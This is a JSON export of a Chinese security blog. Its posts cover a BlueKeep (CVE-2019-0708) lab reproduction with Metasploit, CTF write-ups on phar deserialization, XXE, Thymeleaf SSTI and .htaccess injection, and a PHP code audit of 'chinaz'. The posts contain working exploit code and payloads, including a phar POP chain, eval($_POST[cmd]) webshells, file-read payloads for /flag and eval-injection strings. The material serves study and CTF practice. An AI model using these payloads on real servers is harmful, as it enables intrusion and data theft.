四、漏洞修复不使用str_replace()替换关键字，使用preg_replace()直接过滤关键字 第一次写漏洞复现，参考链接里的师傅和力哥写的，这次省赛回来之后就安心代码审计把，我的ctf刚入门就入土了。😂 参考链接https://xz.aliyun.com/t/6068#toc-5 https://zhzhdoai.github.io/2019/08/25/zzzphp1-7-0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","categories":[],"tags":[{"name":"php代码审计","slug":"php代码审计","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"CVE-2019-0708-RCE复现","slug":"CVE-2019-0708-RCE复现","date":"2019-09-09T23:25:49.000Z","updated":"2020-03-31T01:04:19.379Z","comments":true,"path":"2019/09/10/CVE-2019-0708-RCE复现/","link":"","permalink":"https://glotozz.github.io/2019/09/10/CVE-2019-0708-RCE%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 1、准备靶机 二、准备kali 三、开始攻击 四、靶机建议重新安装一台win7sp1，要允许任何人远程桌面连接 参考链接 1、准备靶机 靶机是win7（cn_windows_7_enterprise_x64_dvd_x15-70741），之前复现永恒之蓝也是用它 开启远程连接服务（3389端口） 查看端口 关闭防火墙 二、准备kalikali环境安装更新 12345curl https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;rapid7&#x2F;metasploit-omnibus&#x2F;master&#x2F;config&#x2F;templates&#x2F;metasploit-framework-wrappers&#x2F;msfupdate.erb &gt; msfinstallchmod 755 msfinstall .&#x2F;msfinstall 下载攻击套件放置文件到msf的相应文件夹(如果已存在同名文件,直接覆盖即可) 1234567rdp.rb -&gt; &#x2F;opt&#x2F;metasploit-framework&#x2F;embedded&#x2F;framework&#x2F;lib&#x2F;msf&#x2F;core&#x2F;exploit&#x2F;rdp.rbrdp_scanner.rb -&gt; &#x2F;opt&#x2F;metasploit-framework&#x2F;embedded&#x2F;framework&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;rdp&#x2F;rdp_scanner.rbcve_2019_0708_bluekeep.rb -&gt; &#x2F;opt&#x2F;metasploit-framework&#x2F;embedded&#x2F;framework&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;rdp&#x2F;cve_2019_0708_bluekeep.rbcve_2019_0708_bluekeep_rce.rb -&gt; &#x2F;opt&#x2F;metasploit-framework&#x2F;embedded&#x2F;framework&#x2F;modules&#x2F;exploits&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce.rb 三、开始攻击进入msfconsole 1234.&#x2F;msfconsolereload_alluse exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rceinfo查看相关信息 1234#使用set target ID数字(可选为0-4)设置受害机机器架构 1-实体机 2-VirtualBox 3-VMware 4-Hyper-vset target 3set RHOST 192.168.6.111run 蓝屏了。。。，无法反弹shell 四、靶机建议重新安装一台win7sp1，要允许任何人远程桌面连接ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/ 同样的操作 参考链接https://github.com/mai-lang-chai/CVE-2019-0708-RCE?tdsourcetag=s_pctim_aiomsg","categories":[],"tags":[]},{"title":"bytectf-wp","slug":"bytectf-wp","date":"2019-09-08T22:55:06.000Z","updated":"2020-03-31T01:01:15.100Z","comments":true,"path":"2019/09/09/bytectf-wp/","link":"","permalink":"https://glotozz.github.io/2019/09/09/bytectf-wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 Ezcms 举个栗子demo1（生成） demo2（file_get_contents()为例） demo3 总结利用条件 Boring_code 参考链接 思路来源ROIS Ezcms考点：hash长度扩展攻击，phar反序列化，php自用类ZipArchive hash长度扩展攻击不难，phar反序列化也在buuctf上的Dropbox接触过，可以了解一下 先简单整理一下phar拓展反序列化漏洞 该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作。 phar文件结构可以参考链接，写的很详细。 举个栗子demo1（生成） php.ini中的phar.readonly选项设置为Off，否则无法生成phar 1234567891011121314&lt;?php class TestObject &#123; &#125; @unlink(&quot;phar.phar&quot;); $phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub $o &#x3D; new TestObject(); $phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件 &#x2F;&#x2F;签名自动计算 $phar-&gt;stopBuffering();?&gt; 生成phar.phar，放入winhax查看 发现以序列化的形式存储，那么读取的时候必定存在反序列化。 在通过phar://伪协议解析phar文件时会将meta-data（用户自定义的）反序列化的文件函数有如下： demo2（file_get_contents()为例） demo3 可以修改文件头和后缀名来伪装其他格式 1234567891011121314&lt;?php class TestObject &#123; &#125; @unlink(&quot;phar.phar&quot;); $phar &#x3D; new Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub，增加gif文件头 $o &#x3D; new TestObject(); $phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件 &#x2F;&#x2F;签名自动计算 $phar-&gt;stopBuffering();?&gt; 修改为phar.gif即可 总结利用条件 phar文件能上传到服务器端 存在某个可用的魔术方法作为跳板 文件操作函数的参数可控，且能利用phar://协议 本题 扫描发现存在www.zip文件泄露 index.php 123456789101112131415161718&lt;?phperror_reporting(0);include(&#39;config.php&#39;);if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;]))&#123; $username &#x3D; $_POST[&#39;username&#39;]; $password &#x3D; $_POST[&#39;password&#39;]; $username &#x3D; urldecode($username); $password &#x3D; urldecode($password); if ($password &#x3D;&#x3D;&#x3D; &quot;admin&quot;)&#123; die(&quot;u r not admin !!!&quot;); &#125; $_SESSION[&#39;username&#39;] &#x3D; $username; $_SESSION[&#39;password&#39;] &#x3D; $password; if (login())&#123; echo &#39;&lt;script&gt;location.href&#x3D;&quot;upload.php&quot;;&lt;&#x2F;script&gt;&#39;; &#125;&#125; config.php 12345678910111213141516171819function login()&#123; $secret &#x3D; &quot;********&quot;; setcookie(&quot;hash&quot;, md5($secret.&quot;adminadmin&quot;)); return 1;&#125;function is_admin()&#123; $secret &#x3D; &quot;********&quot;; $username &#x3D; $_SESSION[&#39;username&#39;]; $password &#x3D; $_SESSION[&#39;password&#39;]; if ($username &#x3D;&#x3D; &quot;admin&quot; &amp;&amp; $password !&#x3D; &quot;admin&quot;)&#123; if ($_COOKIE[&#39;user&#39;] &#x3D;&#x3D;&#x3D; md5($secret.$username.$password))&#123; return 1; &#125; &#125; return 0;&#125; hash长度扩展攻击 123456import hashpumpyimport urllibs &#x3D; &quot;52107b08c0f3342d2153ae1d68e6262c&quot;m&#x3D;hashpumpy.hashpump(s,&#39;adminadmin&#39;,&#39;admin1&#39;,8)print m[0]print urllib.quote(m[1]) 注意username和password会存在session中，所以一开始登录时(index.php)就传入admin和得到的m[1]，再上传的时候加上cookie：user=m[0] 再cookie中加上user 成功上传！！👌 以后做题一定要看清楚url，不能根据页面判断，别问我怎么知道的，我裂开了 登录成功后 观察Admin类，会放用户沙箱放一个错误格式的.htaccess，导致用户会访问出现500错误 如果能利用Admin类的uplaod_file()方法把这个.htaccess移走就好啦，但是这里只能move用户post上传的文件。 123还有一个Profile类，有个call方法，并且$admin是我们可以控制的，搜了一下PHP有个自用类ZipArchive，当第二个参数为ZIPARCHIVE::OVERWRITE 时，可以对已经存在的文件进行覆盖操作。并且可以通过File类的__destruct()触发Profile类的__call()，并且利用ZipArchive类来重写.htaccess 搜索 ::open exp 123456789101112131415161718192021222324252627282930313233343536&lt;?php class File&#123; public $filename; public $filepath; public $checker; function __construct() &#123; $this-&gt;checker = new Profile(); &#125; function __destruct() &#123; if (isset($this-&gt;checker)) &#123; $this-&gt;checker-&gt;upload_file(); &#125; &#125; &#125; class Profile&#123; public $username; public $password; public $admin; function __construct() &#123; $this-&gt;admin = new ZipArchive; $this-&gt;username = '/var/www/html/sandbox/848516b9a263eb46fd487ce1cd295f06/.htaccess'; $this-&gt;password = ZIPARCHIVE::OVERWRITE; &#125; function __call($name, $arguments) &#123; $this-&gt;admin-&gt;open($this-&gt;username, $this-&gt;password); &#125; &#125; @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER();?&gt;\"); //设置stub $o = new File(); $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering(); 上传sandbox/fd40c7f4125a9b9ff1a4e75d293e3080/9c7f4a2fbf2dd3dfb7051727a644d99f.phar view.php中访问，利用php://filter绕过正则表达式对phar的过滤 12view.php?filename&#x3D;&amp;filepath&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;phar:&#x2F;&#x2F;sandbox&#x2F;848516b9a263eb46fd487ce1cd295f06&#x2F;3a9958c0490c6d5f6ca6d3fa1d23ed04.phar 再传个，这里eval等黑名单=。=，因此不考虑RCE了 123&lt;?php var_dump(file_get_contents(&quot;&#x2F;flag&quot;));?&gt; 123&lt;?php include(&#39;&#x2F;flag&#39;);?&gt; 访问即可 Boring_code12345678910111213141516171819202122232425262728293031323334&lt;?php function is_valid_url($url) &#123; if (filter_var($url, FILTER_VALIDATE_URL)) &#123; if (preg_match('/data:\\/\\//i', $url)) &#123; return false; &#125; return true; &#125; return false; &#125; if (isset($_POST['url']))&#123; $url = $_POST['url']; if (is_valid_url($url)) &#123; $r = parse_url($url); if (preg_match('/baidu\\.com$/', $r['host'])) &#123; $code = file_get_contents($url); if (';' === preg_replace('/[a-z]+\\((?R)?\\)/', NULL, $code)) &#123; if (preg_match('/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', $code)) &#123; echo 'bye~'; &#125; else &#123; eval($code); &#125; &#125; &#125; else &#123; echo \"error: host not allowed\"; &#125; &#125; else &#123; echo \"error: invalid url\"; &#125; &#125;else&#123; highlight_file(__FILE__); &#125;?&gt; 三层过滤。。。 一、filter_var()函数检查url的合法性，不能包含data:// 二、parse_url()解析url的host必须以baidu.com结尾 三、正则匹配字母，(?R)是引用当前表达式的意思，相当于/[a-z]+()/循环匹配，最后只剩下分号，再一次正则匹配过滤含et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log 对于1、2步，filter_var()对于下面的会返回true，但是file_get_contents()是读取不到这种格式的 1230:&#x2F;&#x2F;evil.com;goole.com0:&#x2F;&#x2F;evil.com:80;goole.com:800:&#x2F;&#x2F;evil.com:80\\goole.com:80 然后解决办法是利用百度的重定向到我们的vps 将jump.bdimg.com替换为post.baidu.com就行（如果是tieba.baidu.com会经过一次重定向确认） 1http:&#x2F;&#x2F;post.baidu.com&#x2F;safecheck&#x2F;index?url&#x3D;x+Z5mMbGPAuxvzMQ1JtsluyAASn3sWLlrv9d2NrzuKbjKs5SMwD6pElPPJrrtcEVomErKkpqfg2pp+mC+8YGv66a3rkR4NVhredtiNPp&#x2F;vJz3AtxgIS8yHY9qHh6BM0y 能重定向到我们的vps啦😁 要url编码一下，否则会invalid 1http%3a%2f%2fpost.baidu.com%2fsafecheck%2findex%3furl%3dx%2bZ5mMbGPAuxvzMQ1JtsluyAASn3sWLlrv9d2NrzuKbjKs5SMwD6pElPPJrrtcEVomErKkpqfg2pp%2bmC%2b8YGv66a3rkR4NVhredtiNPp%2fvJz3AtxgIS8yHY9qHh6BM0y 第3步是简单来说就是只能执行一个函数，但不能设置参数，codebreaking中遇到过，当时paylaod是 1readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd()))))))); 所以，排除直接获取路径，我们只能够通过构造字符.来获取路径 readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));通过各种尝试，最后发现了一种函数time()，他能根据时间的不同来返回不同的整数,再利用chr()返回字母 最后构造 1readfile(end(scandir(chr(time(chdir(next(scandir(chr(time()))))))))); 其中第一个chr(time())取到 . 时，列出当前目录 next()取到 .. chdir(‘..’)返回上一级目录，返回值如果成功就是True，失败就是False time(True) 里面的参数不影响仍返回 . end()取到最后一个文件 最后用bp爆破下就行，题目环境关了，我裂开了。 用vps搭一下，又发现一个很奇怪的问题。。。 明明打印$code=&quot;readfile(end(scandir(chr(time(chdir(next(scandir(chr(time())))))))));&quot; 打印preg_replace(&#39;/[a-z]+\\((?R)?\\)/&#39;, NULL, $code) 为 ; 但是却进不了循环 经过韩师傅的提醒，是在vi模式下输入结束后自动添加了个换行，我查看了一下确实如此。再windows下写好上传即可， 成功了 参考链接https://paper.seebug.org/680/ https://paper.seebug.org/561/#parse_urllibcurlurlssrf https://paper.seebug.org/561/ https://www.4xseo.com/marketing/1280/#title-0","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"XNUCA-EZPHP-wp","slug":"XNUCA-EZPHP-wp","date":"2019-09-01T23:13:56.000Z","updated":"2020-03-31T00:21:09.158Z","comments":true,"path":"2019/09/02/XNUCA-EZPHP-wp/","link":"","permalink":"https://glotozz.github.io/2019/09/02/XNUCA-EZPHP-wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 源码 12345678910111213141516171819202122232425262728293031323334&lt;?php $files = scandir('./'); foreach($files as $file) &#123; if(is_file($file))&#123; if ($file !== \"index.php\") &#123; unlink($file); &#125; &#125; &#125; include_once(\"fl3g.php\"); if(!isset($_GET['content']) || !isset($_GET['filename'])) &#123; highlight_file(__FILE__); die(); &#125; $content = $_GET['content']; if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) &#123; echo \"Hacker\"; die(); &#125; $filename = $_GET['filename']; if(preg_match(\"/[^a-z\\.]/\", $filename) == 1) &#123; echo \"Hacker\"; die(); &#125; $files = scandir('./'); foreach($files as $file) &#123; if(is_file($file))&#123; if ($file !== \"index.php\") &#123; unlink($file); &#125; &#125; &#125; file_put_contents($filename, $content . \"\\nJust one chance\"); ?&gt; 简单分析，先列出当前文件夹下所有文件，删除除index.php外的文件，包含一个fl3g.php，传参，对文件名和文件内容分别有一个preg_match()和stristr()过滤，再删除一次文件，最后file_put_contents()，也就是我们的利用点 这里记录下最简单、最容易理解的一种方法，.htaccess和.user.ini都支持在开头文件包含，但是生效的条件不同 用\\n绕过stristr的检测，文件名用.htaccess（主要是这里不支持.user.ini，需要cgi/fcgi模式），preg_match()就不需要绕过，并且理论上我们写的是开头自动包含，会在删除前执行我们包含的马 构造 12?content&#x3D;php_value%20auto_prepend_fil\\%0ae%20.htaccess%0a%23&lt;?php%20system(&#39;cat%20&#x2F;fla&#39;.&#39;g&#39;);?&gt;\\&amp;filename&#x3D;.htaccess ，那么写入.htaccess的内容为 1234php_value auto_prepend_fil\\e .htaccess#&lt;?php system(&#39;cat &#x2F;fla&#39;.&#39;g&#39;);?&gt;\\Just one chance","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"ogeek-web","slug":"ogeek-web","date":"2019-08-27T09:17:42.000Z","updated":"2020-03-31T00:35:20.128Z","comments":true,"path":"2019/08/27/ogeek-web/","link":"","permalink":"https://glotozz.github.io/2019/08/27/ogeek-web/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 LookAround render Easy Realworld Chanllenge Enjoy You Self 参考链接 LookAroundxxe盲注。blind xxe思想就是将数据通过外部服务器或者报错信息带出来 首先尝试http协议，发现访问不了外部服务器，会出现超时的情况 那么就只能是本地dtd报错数据带出数据 需要本地dtd的绝对路径，给出了镜像名， 发现/usr/share/xml/fontconfig/fonts.dtd是正确的 构造 1234567891011121314&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;xml&#x2F;fontconfig&#x2F;fonts.dtd&quot;&gt; &lt;!ENTITY % expr &#39;aaa)&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa (bb&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt; render是java的ssti，错误回显是Spring boot的 1&#123;&quot;content&quot;:&quot;$&#123;1+1&#125;&quot;&#125; 发现不行，Spring boot常用的几把梭，wp里说是Thymeleaf 1[[$&#123;1+1&#125;]] 发现可以，然后构造读文件，按行 1&#123;&quot;content&quot;:&quot;[[$&#123;new java.io.BufferedReader(new java.io.FileReader(\\&quot;&#x2F;flag\\&quot;)).readLine()&#125;]]&quot;&#125; 得到flag Easy Realworld Chanllenge先用telnet://172.18.0.3:21连接，账号密码是弱口令ctf、ctf PASV、然后计算一下端口 然后用计算出的端口连接 我不小心按了最下面的类似播放的图标，导致一部分操作看不见了。。。 Enjoy You Self这里先检查了 filename 是不是八位（包括下划线在内的任何字字符 [A-Za-z0-9_]）。是的话就创建一个这个名字的文件。删除列出的第一个文件。而文件根据文件名的字符集排序，所以只要我们的文件没被删掉，说明原来存在的文件名比我们的小 脚本就先不贴了，也没环境。。。 然后居然还有娃题 这个文件是个下载器，可以把远程服务器的东西下载到这个服务器上。在自己服务器上创建一个文件，然后把所有访问都重写到这个文件。 这里都是参考zhaojin师傅的，思路很清楚👍 举个栗子 123&lt;?php header(&#39;Content-Type:glotozz&#x2F;php&#x2F;.&#39;); echo &#39;&lt;?php eval($_POST[cmd]); ?&gt;&#39;; 再写个glotozz/glotozz.txt 123&lt;?php header(&#39;Content-Type:glotozz&#x2F;txt&#39;); echo &#39;&lt;?php eval($_POST[cmd]); ?&gt;&#39;; 再写个.user.ini 123&lt;?php header(&#39;Content-Type:..&#x2F;.&#x2F;.user.ini&#39;); echo &#39;auto_prepend_file &#x3D; &#x2F;var&#x2F;www&#x2F;html&#x2F;users&#x2F;xxxxx&#x2F;uploads&#x2F;glotozz&#x2F;glotozz.txt&#39;; 最后，需要用脚本上传，因为清理的比较快 参考链接https://www.zhaoj.in/read-6251.html?tdsourcetag=s_pctim_aiomsg https://www.freebuf.com/vuls/207639.html","categories":[],"tags":[]},{"title":"chinaz的代码执行和命令执行漏洞","slug":"chinaz的代码执行和命令执行漏洞","date":"2019-08-13T04:57:44.000Z","updated":"2020-04-02T03:00:55.275Z","comments":true,"path":"2019/08/13/chinaz的代码执行和命令执行漏洞/","link":"","permalink":"https://glotozz.github.io/2019/08/13/chinaz%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 简单分析 漏洞一 漏洞二 漏洞三 简单分析index.php index页面通过page参数调用不同功能的php页面 library/view.php先初始化View类 跟踪echoContent() 先加载一个初始化模版文件，默认为js，经过三次模版解析，这里以第一个，也是最简单的parseHeadAndFoot()为例 很简单，就是将{chinaz:header}用准备好的文件内容替换 action.php 存在文件包含，但是存在后缀.php，经过filter过滤，跟踪 将 . 过滤成空，文件包含路径中不能有 . 导致无法使用相对路径 那么我们可以使用绝对路径进行包含。 可以包含常见重要文件或日志文件 漏洞一搜索write common.php 存在文件写入，搜索调用 当访问不存在的页面时，写入$filePath到logs/logfile.php中 那么构造payload： 1?page&#x3D;&lt;?php phpinfo();?&gt; 访问： 1&#x2F;logs&#x2F;logfile.php 如果没有直接访问权限，也可以使用action.php中的文件包含， 并且可以看到phpinfo中，因此无法远程文件包含 漏洞二搜索preg_replace( normaliz.php preg_replace()的正则如果加了e这个选项，会把正则表达式替换的部分替换之后的内容执行一下，然后将执行完的结果放入需要被替换的位置 但是php7.0.0开始，不再支持/e修饰符，请用preg_replace_callback()代替 而且从前面的phpinfo得知我们的PHP版本是7.3.4🤦‍ 那么我把php版本改成php5.4.45 追踪$post_data， action.php 所以我们需要访问action.php再利用$page变量包含normaliz 构造 1234http:&#x2F;&#x2F;127.0.0.1&#x2F;chinaz&#x2F;action.phpPOST:page&#x3D;normaliz&amp;method&#x3D;&#x2F;a&#x2F;e&amp;mail_replacement&#x3D;phpinfo()&amp;source&#x3D;a 就相当于 1preg_replace(&quot;&#x2F;a&#x2F;e&quot;,&quot;phpinfo()&quot;,&quot;a&quot;); 漏洞三搜索eval( view.php 基本上每个页面都存在模版渲染，那么这里以md5.php为例 很明显这里只要不传入$method，$res就是我们传入的值 我们先简单构造，先调试下看看 1234http:&#x2F;&#x2F;127.0.0.1&#x2F;chinaz&#x2F;action.phpPOST:page&#x3D;md5&amp;res&#x3D;123 尝试构造 12345@eval(&quot;if(&quot;.$strIf.&quot;)&#123;&#125;&#123;&#125;&quot;);&#x3D;&gt;@eval(&quot;if(\\&quot;\\&quot; or phpinfo() or \\&quot;\\&quot;&#x3D;&#x3D;\\&quot;\\&quot;)&#123;&#125;&#123;&#125;&quot;);&#x3D;&gt;&quot; or phpinfo() or &quot; 类似的payload 12POST:page&#x3D;md5&amp;res&#x3D;&quot;or @eval($_POST[addd])or &quot;&amp;addd&#x3D;phpinfo(); 大致如下 1@eval(&quot;if(\\&quot;\\&quot;or @eval(\\&quot;phpinfo();\\&quot;)or \\&quot;\\&quot;&#x3D;&#x3D;\\&quot;\\&quot;)&#123;&#125;else&#123;&#125;&quot;);","categories":[],"tags":[{"name":"php代码审计","slug":"php代码审计","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]}]}